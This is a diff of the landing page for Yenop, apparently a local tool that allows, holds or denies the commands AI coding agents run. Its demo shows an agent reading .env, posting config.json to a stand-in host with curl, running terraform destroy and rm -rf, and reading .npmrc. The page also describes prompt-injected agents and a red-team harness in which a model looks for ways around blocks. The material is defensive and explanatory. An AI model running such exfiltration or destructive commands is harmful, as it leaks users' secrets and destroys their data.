@@ -4,104 +4,189 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Yenop — Agents decide what to do. Yenop decides what is allowed to happen.</title>
-<meta name="description" content="A local-first execution authorization layer for AI coding agents. One set of rules across Claude Code, Cursor, Codex, Gemini and MCP. Your commands, prompts and source stay on your machine.">
+<meta name="description" content="A local-first execution authorization layer for AI coding agents. Every command, file access and tool call is judged before it runs: allow, ask a person, or deny. One set of rules across Claude Code, Cursor, Codex, Gemini and MCP. Nothing leaves your machine.">
 <link rel="canonical" href="https://yenop.com/">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="Yenop">
 <meta property="og:url" content="https://yenop.com/">
 <meta property="og:title" content="Yenop — the execution authorization layer for AI coding agents">
-<meta property="og:description" content="See what your AI coding agent is actually allowed to do. Local-first ALLOW / ASK / DENY across Claude Code, Cursor, Codex, Gemini and MCP.">
+<meta property="og:description" content="Every command, file access and tool call judged before it runs: allow, ask a person, or deny. Deterministic, ~2 ms, local. Claude Code, Cursor, Codex, Gemini, OpenAI Agents SDK and MCP.">
 <meta property="og:image" content="https://yenop.com/og.png">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Yenop — the execution authorization layer for AI coding agents">
-<meta name="twitter:description" content="See what your AI coding agent is actually allowed to do. Local-first ALLOW / ASK / DENY across Claude Code, Cursor, Codex, Gemini and MCP.">
+<meta name="twitter:description" content="Every command, file access and tool call judged before it runs: allow, ask a person, or deny. Deterministic, ~2 ms, local.">
 <meta name="twitter:image" content="https://yenop.com/og.png">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230b0f14'/%3E%3Cpath d='M9 8l7 9 7-9M16 17v7' stroke='%23e6edf3' stroke-width='3' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
-<a class="preview" href="https://github.com/yenopdev/yenop#readme">Pre-alpha · Developer Preview</a>
+<header class="nav"><div class="wrap">
+  <a class="brand" href="./"><svg viewBox="0 0 32 32" aria-hidden="true"><rect width="32" height="32" rx="7" fill="#161F2A" stroke="#2A3542"/><path d="M9 8l7 9 7-9M16 17v7" stroke="#E6EDF3" stroke-width="2.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>Yenop</a>
+  <nav class="links"><a href="#how">How it decides</a><a href="#with">Works with</a><a href="#proof">Proof</a><a href="security/">Security</a><a href="https://github.com/yenopdev/yenop" target="_blank" rel="noopener">GitHub</a></nav>
+  <a class="pill mono desk" href="https://www.npmjs.com/package/yenop" target="_blank" rel="noopener">npm i -g yenop</a>
+  <details class="menu"><summary aria-label="Menu"><span></span><span></span><span></span></summary>
+    <div class="sheet"><a href="#how">How it decides</a><a href="#with">Works with</a><a href="#proof">Proof</a><a href="security/">Security</a><a href="https://github.com/yenopdev/yenop" target="_blank" rel="noopener">GitHub</a><a class="mono" href="https://www.npmjs.com/package/yenop" target="_blank" rel="noopener">npm i -g yenop</a></div>
+  </details>
+</div></header>
 
-<header class="hero">
-  <div class="wordmark">YENOP</div>
-  <h1>Agents decide what to do.<br>Yenop decides what is allowed to happen.</h1>
-  <p class="lede">See what your AI coding agent is actually allowed to do.</p>
-  <p class="cta">
-    <a class="btn primary" href="#demo">Watch demo</a>
-    <a class="btn" href="https://github.com/yenopdev/yenop">GitHub</a>
-  </p>
-</header>
-
-<section>
-  <h2>AI agents have real access to your machine.</h2>
-  <p>A coding agent runs shell commands, edits files, calls tool servers and reaches the network on your behalf. Its own permission prompt is the model asking itself. Yenop puts an independent authorization layer between the agent and execution: every action is parsed, judged against policy, and answered before it runs.</p>
-  <div class="verdicts">
-    <div class="verdict allow"><b>ALLOW</b><span>the boring majority, silently</span></div>
-    <div class="verdict ask"><b>ASK</b><span>a person sees it first, with the run's history</span></div>
-    <div class="verdict deny"><b>DENY</b><span>never reaches the tool</span></div>
+<main class="wrap">
+<section class="hero" style="border-top:0">
+  <div class="eyebrow">Pre-alpha · Developer preview 0.1.1</div>
+  <h1>Agents decide what to do. Yenop decides what is allowed to happen.</h1>
+  <p class="lede">A local layer between your coding agent and your machine. Every command, file access and tool call is judged before it runs: allowed silently, held for you, or denied with the rule named. Same rules for every agent. Nothing leaves your machine.</p>
+  <div class="cta">
+    <span class="install mono"><b>$</b> <span class="cmdtext">npm install -g yenop &amp;&amp; yenop init</span> <button type="button" data-copy aria-label="Copy the install command">copy</button></span>
+    <a class="btn primary" href="https://github.com/yenopdev/yenop#see-it-in-thirty-seconds" target="_blank" rel="noopener">See it in thirty seconds</a>
+    <a class="btn" href="security/">Read the threat model</a>
   </div>
-</section>
-
-<section id="demo">
-  <h2>Ninety seconds</h2>
-  <div class="term" aria-label="Demo transcript">
-<pre><span class="agent">agent</span>  I found the .env file. I'll read it to get the database URL.
-<span class="cmd">$ cat .env</span>
-<span class="deny">DENY</span>   no-secret-files: a credential path
-
-<span class="agent">agent</span>  I'll send the configuration to the debugging service.
-<span class="cmd">$ curl -X POST https://collect.example -d @config.json</span>
-<span class="deny">DENY</span>   external-network-after-sensitive-data: this run has touched sensitive data
-
-<span class="agent">agent</span>  I'll run terraform destroy to clean up the old environment.
-<span class="cmd">$ terraform destroy -auto-approve</span>
-<span class="ask">ASK</span>    destructive-shell
-       run history: read untrusted content (issue #142), then read infra/prod.tfvars
-<span class="you">you</span>    allow
-
-<span class="cmd">$ yenop report</span>
-Runs          1     Actions        23
-ALLOW        17     ASK            4     DENY   2
-Denies by rule
-  no-secret-files                          1
-  external-network-after-sensitive-data    1</pre>
-  </div>
-  <p class="small">A scripted version of this runs on your machine in thirty seconds: <code>yenop demo</code>. Nothing in it is real.</p>
-</section>
-
-<section>
-  <h2>Works with</h2>
-  <ul class="runtimes">
-    <li>Claude Code</li>
-    <li>Cursor</li>
-    <li>Codex CLI</li>
-    <li>Gemini CLI</li>
-    <li>OpenAI Agents SDK</li>
-    <li>Any MCP client</li>
+  <ul class="facts">
+    <li><b>Local-first.</b> Decisions, policies and receipts stay on your machine. No cloud, no account.</li>
+    <li><b>Deterministic.</b> A rule, not a probability. About 2 ms per decision, no model in the loop.</li>
+    <li><b>One rule set.</b> Claude Code, Cursor, Codex, Gemini, the OpenAI Agents SDK, MCP: judged the same way.</li>
   </ul>
-  <p>One engine, one policy language, one receipts log. A rule written once applies to every agent you run, and the boundary does not move when the model, the runtime or the tool server changes.</p>
+
+  <div class="stage">
+    <div class="frame">
+      <div class="bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="t">Cursor · yenop-playground · Agent</span></div>
+      <div class="chat">
+        <div class="u">Delete the build folder.</div>
+        <p class="m">Thought briefly · Ran <span class="mono">ls -la</span> · Pending approval</p>
+        <div class="approval">
+          <div class="h"><span>Remove the build directory</span><span class="mono">ls, rm, test, echo</span></div>
+          <div class="cmd mono">$ ls -la build &amp;&amp; <i>rm -rf build</i> &amp;&amp; test ! -e build &amp;&amp; echo "deleted"</div>
+          <div class="act"><span>Run Everything (Unsandboxed)</span><span>Skip &nbsp; <b>Run ↵</b></span></div>
+          <div class="why"><em>Hook requested approval: Yenop:</em> Needs a person: destructive-shell. Just before: 2 Grep /Users/…/yenop-playground; 3 Bash ls -la; 4 Bash ls -la.</div>
+        </div>
+      </div>
+    </div>
+    <div class="frame">
+      <div class="bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="t">yenop viewer · 127.0.0.1:51349 · playground</span></div>
+      <div class="tbl"><table class="mono">
+        <thead><tr><th>time</th><th>verdict</th><th>action</th></tr></thead>
+        <tbody>
+          <tr><td>22:37:40</td><td><span class="v ask">ASK</span></td><td class="cmdc">Write .cursor/hooks.json</td></tr>
+          <tr><td>22:37:13</td><td><span class="v deny">DENY</span></td><td class="cmdc">Read .npmrc</td></tr>
+          <tr><td>22:36:05</td><td><span class="v ask">ASK</span></td><td class="cmdc">rm -rf build &amp;&amp; …</td></tr>
+          <tr><td>22:36:02</td><td><span class="v allow">ALLOW</span></td><td class="cmdc">ls -la</td></tr>
+          <tr><td>22:32:45</td><td><span class="v allow">ALLOW</span></td><td class="cmdc">npm test</td></tr>
+          <tr><td>22:02:01</td><td><span class="v deny">DENY</span></td><td class="cmdc">ls -a .npmrc</td></tr>
+          <tr><td>21:50:31</td><td><span class="v allow">ALLOW</span></td><td class="cmdc">cat ./infra/main.tf …</td></tr>
+        </tbody>
+      </table></div>
+      <div class="foot"><span>allow <b>104</b></span><span>ask <b>21</b></span><span>deny <b>5</b></span><span>approval rate <b>25%</b></span></div>
+    </div>
+  </div>
 </section>
 
-<section>
-  <h2>Get started</h2>
-<pre class="install"><code>npm install -g yenop
-cd your-project
-yenop init          # hooks the agents it finds
-yenop demo          # a scripted attack, judged live
-yenop viewer --open # watch the receipts</code></pre>
-  <p>Start in <b>observe mode</b>: nothing is blocked, everything is recorded. Run it for a week, then read <code>yenop report</code> and see what would have been stopped.</p>
-  <p class="cta"><a class="btn primary" href="https://github.com/yenopdev/yenop#quickstart">Quickstart</a> <a class="btn" href="security/">Threat model</a></p>
+<section id="why">
+  <div class="two">
+    <div><div class="eyebrow">The problem</div><h2>The agent's permission prompt is the agent asking itself.</h2></div>
+    <div><p>A coding agent runs shell commands, edits files, calls tool servers and reaches the network for you. When it asks "may I?", the same model that was convinced by a web page decides whether to ask at all. And every runtime asks in its own way, with its own rules, that change with its next release.</p><p>Yenop is a boundary outside all of them: it reads the actual command and path, remembers what the run has already done, and answers from a rule you can read.</p></div>
+  </div>
+  <div class="cards">
+    <div class="card"><svg viewBox="0 0 200 84"><rect x="10" y="30" width="60" height="26" rx="4" fill="#161F2A" stroke="#2A3542"/><text x="40" y="47" fill="#8B98A5" font-size="10" text-anchor="middle" font-family="IBM Plex Mono">model</text><path d="M70 43h50" stroke="#D29922" stroke-dasharray="3 3"/><path d="M120 43l-6-4v8z" fill="#D29922"/><rect x="128" y="30" width="60" height="26" rx="4" fill="#161F2A" stroke="#2A3542"/><text x="158" y="47" fill="#8B98A5" font-size="10" text-anchor="middle" font-family="IBM Plex Mono">may I?</text></svg><h3>A mood, not a boundary</h3><p>The model's refusal today is not the model's refusal tomorrow. A boundary has to sit outside the thing it governs.</p></div>
+    <div class="card"><svg viewBox="0 0 200 84"><g fill="#161F2A" stroke="#2A3542"><rect x="8" y="34" width="40" height="18" rx="3"/><rect x="60" y="34" width="40" height="18" rx="3"/><rect x="112" y="34" width="40" height="18" rx="3"/></g><g fill="#3FB950" font-size="9" font-family="IBM Plex Mono" text-anchor="middle"><text x="28" y="46">read</text><text x="80" y="46">env</text><text x="132" y="46">curl</text></g><path d="M48 43h12M100 43h12M152 43h12" stroke="#5C6B7A"/><rect x="164" y="34" width="30" height="18" rx="3" fill="rgba(248,81,73,.15)" stroke="#F85149"/><text x="179" y="46" fill="#F85149" font-size="9" font-family="IBM Plex Mono" text-anchor="middle">out</text></svg><h3>Harmless steps, harmful plan</h3><p>Read a page, dump the environment, fetch a URL. Each call looks fine alone. The run does not, and Yenop judges the run.</p></div>
+    <div class="card"><svg viewBox="0 0 200 84"><g fill="#161F2A" stroke="#2A3542"><rect x="10" y="12" width="52" height="20" rx="3"/><rect x="10" y="52" width="52" height="20" rx="3"/><rect x="138" y="12" width="52" height="20" rx="3"/><rect x="138" y="52" width="52" height="20" rx="3"/></g><g fill="#8B98A5" font-size="9" font-family="IBM Plex Mono" text-anchor="middle"><text x="36" y="25">Claude</text><text x="36" y="65">Cursor</text><text x="164" y="25">Codex</text><text x="164" y="65">Gemini</text></g><rect x="78" y="30" width="44" height="24" rx="4" fill="#E6EDF3"/><text x="100" y="46" fill="#0B0F14" font-size="9" font-weight="600" font-family="IBM Plex Mono" text-anchor="middle">one rule</text><path d="M62 22h16v8M62 62h16v-8M138 22h-16v8M138 62h-16v-8" stroke="#5C6B7A" fill="none"/></svg><h3>Four agents, four rulebooks</h3><p>A team runs Claude Code, Cursor and Codex on the same repository. One policy, judged the same way, written to one record.</p></div>
+    <div class="card"><svg viewBox="0 0 200 84"><g font-family="IBM Plex Mono" font-size="9" fill="#8B98A5"><text x="12" y="22">prev: 9f2a…</text><text x="12" y="42">prev: 41c0…</text><text x="12" y="62">prev: b7e3…</text></g><g stroke="#3FB950" fill="none"><path d="M100 16v12M100 36v12M100 56v10"/></g><g fill="#161F2A" stroke="#2A3542"><rect x="120" y="10" width="68" height="14" rx="2"/><rect x="120" y="30" width="68" height="14" rx="2"/><rect x="120" y="50" width="68" height="14" rx="2"/></g><g fill="#3FB950" font-size="8" font-family="IBM Plex Mono"><text x="126" y="20">ALLOW</text><text x="126" y="40">ASK → ran</text><text x="126" y="60">DENY</text></g></svg><h3>Logs you can only trust</h3><p>Receipts are a hash chain: any edit, deletion or reordering is detectable. <span class="mono">yenop receipts --verify</span> proves it to anyone.</p></div>
+  </div>
 </section>
 
-<section class="local">
-  <h2>Local-first. No cloud required.</h2>
-  <p>Decisions are made on your machine, in under a millisecond, by a deterministic engine. Your commands, prompts and source stay local. Telemetry is off by default; when you turn it on it sends counts, never content, and <code>yenop telemetry status</code> prints exactly what would leave.</p>
+<section id="local">
+  <div class="two">
+    <div><div class="eyebrow">Local-first</div><h2>Your commands, prompts and source stay on your machine.</h2></div>
+    <div><p>Decisions are made on your machine by a deterministic engine; the daemon listens on 127.0.0.1 only and needs a token. Policies are files you can read, receipts are a file you own, and nothing about your work is sent anywhere: no source, no prompts, no commands, no hostnames.</p><p>Telemetry is off until you turn it on. When you do, it sends counts, never content, and <span class="mono">yenop telemetry status</span> prints exactly what would leave. The same rule applies to this page: it loads nothing from anyone else, no analytics, no third-party fonts or scripts.</p><p><a href="security/">What leaves your machine, in full, on the security page.</a></p></div>
+  </div>
 </section>
 
-<footer>
-  <p>Pre-alpha · Developer Preview. Source-available under FSL-1.1-ALv2. <a href="https://github.com/yenopdev/yenop">GitHub</a> · <a href="https://github.com/yenopdev/yenop/discussions">Discussions</a> · <a href="security/">Security</a></p>
-</footer>
+<section id="how">
+  <div class="two">
+    <div><div class="eyebrow">How it decides</div><h2>Parsed, not pattern-matched. Deterministic, in about two milliseconds.</h2></div>
+    <div><p>The command is parsed into programs, paths and flows, wrappers and variables followed, code handed to an interpreter treated as opaque. The run's history is attached: has it taken in outside content, has it touched sensitive data. Policies in Cedar say what may happen and what a person must see first. The answer is a rule, never a probability, and it comes back before the agent notices.</p><p>An ask carries the history, so the person deciding sees why: "this run read an issue page two steps ago, then infra/prod.tfvars."</p></div>
+  </div>
+  <div class="pipe"><svg viewBox="0 0 1000 150" role="img" aria-label="Decision pipeline">
+    <defs><marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M0 0L10 5 0 10z" fill="#5C6B7A"/></marker></defs>
+    <g font-family="IBM Plex Sans" font-size="13" fill="#E6EDF3" text-anchor="middle">
+      <g><rect x="10" y="40" width="130" height="56" rx="6" fill="#111820" stroke="#2A3542"/><text x="75" y="64">action</text><text x="75" y="82" font-size="11" fill="#8B98A5">any hooked agent</text></g>
+      <path d="M140 68h40" stroke="#5C6B7A" marker-end="url(#ar)"/>
+      <g><rect x="182" y="40" width="130" height="56" rx="6" fill="#111820" stroke="#2A3542"/><text x="247" y="64">parse</text><text x="247" y="82" font-size="11" fill="#8B98A5">programs · paths · flows</text></g>
+      <path d="M312 68h40" stroke="#5C6B7A" marker-end="url(#ar)"/>
+      <g><rect x="354" y="40" width="130" height="56" rx="6" fill="#111820" stroke="#2A3542"/><text x="419" y="64">run history</text><text x="419" y="82" font-size="11" fill="#8B98A5">untrusted in? sensitive?</text></g>
+      <path d="M484 68h40" stroke="#5C6B7A" marker-end="url(#ar)"/>
+      <g><rect x="526" y="40" width="130" height="56" rx="6" fill="#111820" stroke="#2A3542"/><text x="591" y="64">policy</text><text x="591" y="82" font-size="11" fill="#8B98A5">permit · approve (Cedar)</text></g>
+      <path d="M656 68h40" stroke="#5C6B7A" marker-end="url(#ar)"/>
+      <g font-family="IBM Plex Mono" font-weight="600" font-size="12"><rect x="698" y="22" width="86" height="26" rx="4" fill="rgba(63,185,80,.15)" stroke="#3FB950"/><text x="741" y="40" fill="#3FB950">ALLOW</text><rect x="698" y="55" width="86" height="26" rx="4" fill="rgba(210,153,34,.15)" stroke="#D29922"/><text x="741" y="73" fill="#D29922">ASK</text><rect x="698" y="88" width="86" height="26" rx="4" fill="rgba(248,81,73,.15)" stroke="#F85149"/><text x="741" y="106" fill="#F85149">DENY</text></g>
+      <path d="M784 68h40" stroke="#5C6B7A" marker-end="url(#ar)"/>
+      <g><rect x="826" y="40" width="160" height="56" rx="6" fill="#111820" stroke="#2A3542"/><text x="906" y="64">receipt</text><text x="906" y="82" font-size="11" fill="#8B98A5">hash-chained, local</text></g>
+    </g></svg></div>
+  <div class="stat"><div><b class="mono">~2 ms</b><span>per decision, warm</span></div><div><b class="mono">0</b><span>model calls on the decision path</span></div><div><b class="mono">fail-closed</b><span>an error is a deny</span></div></div>
+</section>
+
+<section id="with">
+  <div class="two">
+    <div><div class="eyebrow">Works with</div><h2>One engine in front of every agent you run.</h2></div>
+    <div><p>Each runtime's event becomes one canonical action, so the engine, the policies, the run state and the receipts never know which agent produced it. Every adapter below was verified in a live session against the current release, and the recorded events are the test fixtures.</p></div>
+  </div>
+  <div class="logos">
+    <a class="logo" href="https://github.com/yenopdev/yenop#every-agent-one-engine" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="m4.7144 15.9555 4.7174-2.6471.079-.2307-.079-.1275h-.2307l-.7893-.0486-2.6956-.0729-2.3375-.0971-2.2646-.1214-.5707-.1215-.5343-.7042.0546-.3522.4797-.3218.686.0608 1.5179.1032 2.2767.1578 1.6514.0972 2.4468.255h.3886l.0546-.1579-.1336-.0971-.1032-.0972L6.973 9.8356l-2.55-1.6879-1.3356-.9714-.7225-.4918-.3643-.4614-.1578-1.0078.6557-.7225.8803.0607.2246.0607.8925.686 1.9064 1.4754 2.4893 1.8336.3643.3035.1457-.1032.0182-.0728-.164-.2733-1.3539-2.4467-1.445-2.4893-.6435-1.032-.17-.6194c-.0607-.255-.1032-.4674-.1032-.7285L6.287.1335 6.6997 0l.9957.1336.419.3642.6192 1.4147 1.0018 2.2282 1.5543 3.0296.4553.8985.2429.8318.091.255h.1579v-.1457l.1275-1.706.2368-2.0947.2307-2.6957.0789-.7589.3764-.9107.7468-.4918.5828.2793.4797.686-.0668.4433-.2853 1.8517-.5586 2.9021-.3643 1.9429h.2125l.2429-.2429.9835-1.3053 1.6514-2.0643.7286-.8196.85-.9046.5464-.4311h1.0321l.759 1.1293-.34 1.1657-1.0625 1.3478-.8804 1.1414-1.2628 1.7-.7893 1.36.0729.1093.1882-.0183 2.8535-.607 1.5421-.2794 1.8396-.3157.8318.3886.091.3946-.3278.8075-1.967.4857-2.3072.4614-3.4364.8136-.0425.0304.0486.0607 1.5482.1457.6618.0364h1.621l3.0175.2247.7892.522.4736.6376-.079.4857-1.2142.6193-1.6393-.3886-3.825-.9107-1.3113-.3279h-.1822v.1093l1.0929 1.0686 2.0035 1.8092 2.5075 2.3314.1275.5768-.3218.4554-.34-.0486-2.2039-1.6575-.85-.7468-1.9246-1.621h-.1275v.17l.4432.6496 2.3436 3.5214.1214 1.0807-.17.3521-.6071.2125-.6679-.1214-1.3721-1.9246L14.38 17.959l-1.1414-1.9428-.1397.079-.674 7.2552-.3156.3703-.7286.2793-.6071-.4614-.3218-.7468.3218-1.4753.3886-1.9246.3157-1.53.2853-1.9004.17-.6314-.0121-.0425-.1397.0182-1.4328 1.9672-2.1796 2.9446-1.7243 1.8456-.4128.164-.7164-.3704.0667-.6618.4008-.5889 2.386-3.0357 1.4389-1.882.929-1.0868-.0062-.1579h-.0546l-6.3385 4.1164-1.1293.1457-.4857-.4554.0608-.7467.2307-.2429 1.9064-1.3114Z"/></svg><b>Claude Code</b><span>verified live</span></a>
+    <a class="logo" href="https://github.com/yenopdev/yenop#every-agent-one-engine" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M11.503.131 1.891 5.678a.84.84 0 0 0-.42.726v11.188c0 .3.162.575.42.724l9.609 5.55a1 1 0 0 0 .998 0l9.61-5.55a.84.84 0 0 0 .42-.724V6.404a.84.84 0 0 0-.42-.726L12.497.131a1.01 1.01 0 0 0-.996 0M2.657 6.338h18.55c.263 0 .43.287.297.515L12.23 22.918c-.062.107-.229.064-.229-.06V12.335a.59.59 0 0 0-.295-.51l-9.11-5.257c-.109-.063-.064-.23.061-.23"/></svg><b>Cursor</b><span>verified live</span></a>
+    <a class="logo" href="https://github.com/yenopdev/yenop#every-agent-one-engine" target="_blank" rel="noopener"><span class="word">OpenAI</span><b>Codex CLI</b><span>verified live</span></a>
+    <a class="logo" href="https://github.com/yenopdev/yenop#every-agent-one-engine" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M11.04 19.32Q12 21.51 12 24q0-2.49.93-4.68.96-2.19 2.58-3.81t3.81-2.55Q21.51 12 24 12q-2.49 0-4.68-.93a12.3 12.3 0 0 1-3.81-2.58 12.3 12.3 0 0 1-2.58-3.81Q12 2.49 12 0q0 2.49-.96 4.68-.93 2.19-2.55 3.81a12.3 12.3 0 0 1-3.81 2.58Q2.49 12 0 12q2.49 0 4.68.96 2.19.93 3.81 2.55t2.55 3.81"/></svg><b>Gemini CLI</b><span>verified live</span></a>
+    <a class="logo" href="https://github.com/yenopdev/yenop/tree/main/examples/openai-agents" target="_blank" rel="noopener"><span class="word">OpenAI</span><b>Agents SDK</b><span>verified live</span></a>
+    <a class="logo" href="https://github.com/yenopdev/yenop#every-agent-one-engine" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M13.85 0a4.16 4.16 0 0 0-2.95 1.217L1.456 10.66a.835.835 0 0 0 0 1.18.835.835 0 0 0 1.18 0l9.442-9.442a2.49 2.49 0 0 1 3.541 0 2.49 2.49 0 0 1 0 3.541L8.59 12.97l-.1.1a.835.835 0 0 0 0 1.18.835.835 0 0 0 1.18 0l.1-.098 7.03-7.034a2.49 2.49 0 0 1 3.542 0l.049.05a2.49 2.49 0 0 1 0 3.54l-8.54 8.54a1.96 1.96 0 0 0 0 2.755l1.753 1.753a.835.835 0 0 0 1.18 0 .835.835 0 0 0 0-1.18l-1.753-1.753a.266.266 0 0 1 0-.394l8.54-8.54a4.185 4.185 0 0 0 0-5.9l-.05-.05a4.16 4.16 0 0 0-2.95-1.218c-.2 0-.401.02-.6.048a4.17 4.17 0 0 0-1.17-3.552A4.16 4.16 0 0 0 13.85 0m0 3.333a.84.84 0 0 0-.59.245L6.275 10.56a4.186 4.186 0 0 0 0 5.902 4.186 4.186 0 0 0 5.902 0L19.16 9.48a.835.835 0 0 0 0-1.18.835.835 0 0 0-1.18 0l-6.985 6.984a2.49 2.49 0 0 1-3.54 0 2.49 2.49 0 0 1 0-3.54l6.983-6.985a.835.835 0 0 0 0-1.18.84.84 0 0 0-.59-.245"/></svg><b>Any MCP client</b><span>gateway</span></a>
+  </div>
+</section>
+
+<section id="proof">
+  <div class="two">
+    <div><div class="eyebrow">Proof</div><h2>Everything on this page is in the repository.</h2></div>
+    <div><p>Not a benchmark you have to take on faith. Three layers of tests run on every push, the adversarial harness lets a real model try to find a way around, and the boundary is stated, including what it does not cover.</p></div>
+  </div>
+  <div class="proof">
+    <div class="card"><b class="mono">14,000</b><p>disguised commands generated per run: wrappers, quoting, variables, Windows paths. Same verdict for every spelling. <a href="https://github.com/yenopdev/yenop/blob/main/src/core/shell.property.test.ts" target="_blank" rel="noopener">shell.property.test.ts</a></p></div>
+    <div class="card"><b class="mono">5 runtimes</b><p>with recorded hook events replayed as fixtures, so a contract change fails a test before it fails a user. <a href="https://github.com/yenopdev/yenop/tree/main/fixtures/hooks" target="_blank" rel="noopener">fixtures/hooks/</a></p></div>
+    <div class="card"><b class="mono">1 red team</b><p>a real model, given a goal and a block, trying another route. Yenop with the runtime's sandbox off. Findings become fixtures. <a href="https://github.com/yenopdev/yenop/tree/main/harness" target="_blank" rel="noopener">harness/</a></p></div>
+    <div class="card"><b class="mono">stated</b><p>what is outside the boundary is listed, not discovered later: root, a compromised host, a path Yenop is not hooked into. <a href="security/">/security</a></p></div>
+  </div>
+</section>
+
+<section id="report">
+  <div class="two">
+    <div><div class="eyebrow">After a week</div><h2>Read what would have been stopped, and whether the asks were right.</h2></div>
+    <div><p>Start in observe mode: nothing blocked, everything recorded. Then <span class="mono">yenop report</span>. The line that matters is the ask approval rate: how often a person allowed what Yenop held. Near 100% means a rule asks too often; near 0% means the asks were real catches. That is how the baseline gets tuned by evidence.</p></div>
+  </div>
+  <div class="report mono" style="margin-top:36px"><span class="k">$</span> yenop report --days 30
+
+Yenop report — last 30 days for "playground"
+
+Runs           19
+Actions       130
+
+ALLOW         104    80.0%
+ASK            21    16.2%
+DENY            5     3.8%
+
+What became of the asks
+  approved, ran                          3
+  not run: rejected or abandoned         9
+  approval rate  25.0%   most asks were refused: these were real catches
+
+Denies by rule
+  no-secret-files                        4
+  no-secret-files-in-shell               1</div>
+  <div class="cta" style="margin-top:32px"><span class="install mono"><b>$</b> <span class="cmdtext">npm install -g yenop &amp;&amp; yenop init</span> <button type="button" data-copy aria-label="Copy the install command">copy</button></span><a class="btn" href="https://github.com/yenopdev/yenop#quickstart" target="_blank" rel="noopener">Quickstart on GitHub</a></div>
+</section>
+
+</main>
+<footer><div class="wrap"><span>Yenop · pre-alpha, developer preview · source-available (FSL-1.1-ALv2)</span><span><a href="https://github.com/yenopdev/yenop" target="_blank" rel="noopener">GitHub</a> · <a href="https://www.npmjs.com/package/yenop" target="_blank" rel="noopener">npm</a> · <a href="https://github.com/yenopdev/yenop/discussions" target="_blank" rel="noopener">Discussions</a> · <a href="security/">Security</a> · security@yenop.com</span></div></footer>
+
+<script>
+for (const b of document.querySelectorAll("[data-copy]")) b.addEventListener("click", async () => {
+  const text = b.parentElement.querySelector(".cmdtext").textContent;
+  try { await navigator.clipboard.writeText(text); b.textContent = "copied"; } catch { b.textContent = "select and copy"; }
+  setTimeout(() => { b.textContent = "copy"; }, 1600);
+});
+</script>
 </body>
 </html>
